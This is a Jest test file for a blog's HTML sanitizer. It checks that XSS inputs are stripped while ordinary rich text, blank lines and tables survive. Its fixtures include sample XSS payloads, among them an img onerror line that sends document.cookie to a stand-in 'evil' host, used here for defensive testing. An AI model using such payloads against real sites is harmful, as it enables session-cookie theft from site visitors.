import { prepareBlogArticleHtml, sanitizeBlogHtml } from '@/lib/blog-article-html'

describe('sanitizeBlogHtml — XSS payloads', () => {
  const payloads: Array<[string, string]> = [
    ['inline script tag', '<script>alert(1)</script>'],
    ['img onerror', '<img src=x onerror="fetch(`//evil/${document.cookie}`)">'],
    ['svg onload', '<svg onload=alert(1)></svg>'],
    ['iframe', '<iframe src="https://evil.test"></iframe>'],
    ['javascript: href', '<a href="javascript:alert(1)">click</a>'],
    ['body onload', '<body onload=alert(1)>'],
    ['form + formaction', '<form><button formaction="javascript:alert(1)">x</button></form>'],
    ['object data', '<object data="data:text/html,<script>alert(1)</script>"></object>'],
    ['style expression', '<div style="background:url(javascript:alert(1))">x</div>'],
    ['nested obfuscation', '<div><scr<script>ipt>alert(1)</scr</script>ipt></div>'],
  ]

  it.each(payloads)('neutralises %s', (_label, payload) => {
    const clean = sanitizeBlogHtml(payload)
    expect(clean).not.toMatch(/<script/i)
    expect(clean).not.toMatch(/<iframe/i)
    expect(clean).not.toMatch(/<object/i)
    expect(clean).not.toMatch(/on(error|load|click)\s*=/i)
    expect(clean).not.toMatch(/javascript:/i)
  })

  // We rely on DOMPurify's default URI policy rather than a custom regexp,
  // so pin the schemes that must stay blocked.
  it.each([
    ['javascript:', '<a href="javascript:alert(1)">x</a>'],
    ['data: html', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
    ['vbscript:', '<a href="vbscript:msgbox(1)">x</a>'],
    ['data: img', '<img src="data:text/html,<script>alert(1)</script>">'],
  ])('strips %s URLs', (_label, payload) => {
    const clean = sanitizeBlogHtml(payload)
    expect(clean).not.toMatch(/javascript:|vbscript:|data:text\/html/i)
  })

  it('drops the exact escalation payload from the audit', () => {
    const clean = sanitizeBlogHtml(
      `<img src=x onerror="fetch('//evil/'+document.cookie)">`,
    )
    expect(clean).not.toContain('onerror')
    expect(clean).not.toContain('document.cookie')
  })
})

describe('sanitizeBlogHtml — legitimate content survives', () => {
  it('keeps ordinary rich text', () => {
    const input =
      '<h2>Title</h2><p><strong>Bold</strong> and <em>italic</em> and <u>underline</u></p><ul><li>one</li><li>two</li></ul>'
    expect(sanitizeBlogHtml(input)).toBe(input)
  })

  it('keeps safe links and images with their attributes', () => {
    const clean = sanitizeBlogHtml(
      '<a href="https://example.com" title="t">link</a><img src="https://cdn.test/a.png" alt="alt text">',
    )
    expect(clean).toContain('href="https://example.com"')
    expect(clean).toContain('alt="alt text"')
    expect(clean).toContain('src="https://cdn.test/a.png"')
  })

  it('keeps relative and mailto links', () => {
    const clean = sanitizeBlogHtml('<a href="/blog">a</a><a href="mailto:x@y.test">b</a>')
    expect(clean).toContain('href="/blog"')
    expect(clean).toContain('href="mailto:x@y.test"')
  })

  it('keeps table markup and colspan/rowspan', () => {
    const clean = sanitizeBlogHtml(
      '<table><tbody><tr><td colspan="2">cell</td></tr></tbody></table>',
    )
    expect(clean).toContain('<table>')
    expect(clean).toContain('colspan="2"')
  })

  it('forces rel=noopener on links that open a new tab', () => {
    const clean = sanitizeBlogHtml('<a href="https://example.com" target="_blank">x</a>')
    expect(clean).toContain('rel="noopener noreferrer"')
  })

  it('returns empty string for empty input', () => {
    expect(sanitizeBlogHtml('')).toBe('')
  })
})

describe('sanitizeBlogHtml — save-time contract', () => {
  it('strips script tags from content destined for the database', () => {
    const dirty = '<p>Hello</p><script>alert(1)</script>'
    expect(sanitizeBlogHtml(dirty)).toBe('<p>Hello</p>')
  })

  // Regression: saving used to delete every empty block, so a blank line the
  // author typed in Quill vanished and the two paragraphs stuck together.
  it('preserves a blank line the author typed between two paragraphs', () => {
    const authored = '<p>Line one</p><p><br></p><p>Line two</p>'
    expect(sanitizeBlogHtml(authored)).toBe(authored)
  })

  it('preserves several blank lines exactly as authored', () => {
    const authored = '<p>a</p><p><br></p><p><br></p><p>b</p>'
    expect(sanitizeBlogHtml(authored)).toBe(authored)
  })

  it('preserves an empty heading rather than silently dropping it', () => {
    const authored = '<h3><br></h3><p>after</p>'
    expect(sanitizeBlogHtml(authored)).toBe(authored)
  })

  it('still strips editor-internal artifacts, which are not authored content', () => {
    const clean = sanitizeBlogHtml(
      '<p><span class="ql-ui" contenteditable="false"></span>text</p>',
    )
    expect(clean).toBe('<p>text</p>')
  })

  it('round-trips: saving already-saved content changes nothing', () => {
    const authored = '<p>one</p><p><br></p><p>two</p>'
    const once = sanitizeBlogHtml(authored)
    expect(sanitizeBlogHtml(once)).toBe(once)
  })
})

describe('prepareBlogArticleHtml — sanitizes and still transforms', () => {
  it('sanitizes before the table transform (both sinks are covered)', () => {
    const clean = prepareBlogArticleHtml('<p>ok</p><script>alert(1)</script>')
    expect(clean).toContain('<p>ok</p>')
    expect(clean).not.toMatch(/<script/i)
  })

  it('still wraps tables in a scroll container', () => {
    const clean = prepareBlogArticleHtml('<table><tbody><tr><td>a</td></tr></tbody></table>')
    expect(clean).toContain('blog-table-scroll')
    expect(clean).toContain('<table>')
  })

  it('still strips Quill editor artifacts', () => {
    const clean = prepareBlogArticleHtml(
      '<p><span class="ql-ui" contenteditable="false"></span>text</p>',
    )
    expect(clean).not.toContain('ql-ui')
    expect(clean).not.toContain('contenteditable')
    expect(clean).toContain('text')
  })

  it('does not double-wrap an already wrapped table', () => {
    const clean = prepareBlogArticleHtml(
      '<div class="ql-table-wrapper blog-table-scroll"><table><tbody><tr><td>a</td></tr></tbody></table></div>',
    )
    expect(clean.match(/blog-table-scroll/g)).toHaveLength(1)
  })

  it('preserves falsy input contract', () => {
    expect(prepareBlogArticleHtml('')).toBe('')
  })

  it('keeps a single authored blank line when rendering', () => {
    const clean = prepareBlogArticleHtml('<p>one</p><p><br></p><p>two</p>')
    expect(clean).toBe('<p>one</p><p><br></p><p>two</p>')
  })

  it('collapses a stack of empty blocks around an embed to one blank line', () => {
    // Quill leaves several of these around images; rendered raw they are a
    // huge gap, but the fix must not remove the blank line entirely.
    const clean = prepareBlogArticleHtml(
      '<p>Intro</p><p><br></p><h3><br></h3><p><br></p><p><img src="https://cdn.test/a.png" alt="a"></p>',
    )
    expect(clean).toBe(
      '<p>Intro</p><p><br></p><p><img src="https://cdn.test/a.png" alt="a"></p>',
    )
  })
})
